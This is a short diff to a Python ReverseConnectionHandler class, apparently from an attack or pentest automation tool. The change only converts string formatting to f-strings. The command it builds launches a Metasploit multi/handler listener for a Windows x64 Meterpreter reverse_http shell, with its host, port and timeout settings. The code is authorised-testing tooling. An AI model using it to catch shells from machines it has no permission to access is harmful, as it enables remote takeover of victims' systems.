@@ -42,12 +42,12 @@ class ReverseConnectionHandler:
             "\""
             "use exploit/multi/handler;"
             "set payload windows/x64/meterpreter/reverse_http;"
-            "set lhost {lhost};"
-            "set lport {lport};"
-            "set ReverseListenerBindAddress {lhost};"
-            "set ListenerTimeout {timeout};"
+            f"set lhost {self.lhost};"
+            f"set lport {self.lport};"
+            f"set ReverseListenerBindAddress {self.lhost};"
+            f"set ListenerTimeout {self.handler_timeout};"
             "exploit;"
-            "\"".format(lhost=self.lhost, lport=self.lport, timeout=self.handler_timeout))
+            "\"")
 
     def shutdown(self):
         self.stdin.write("exit -y\n")
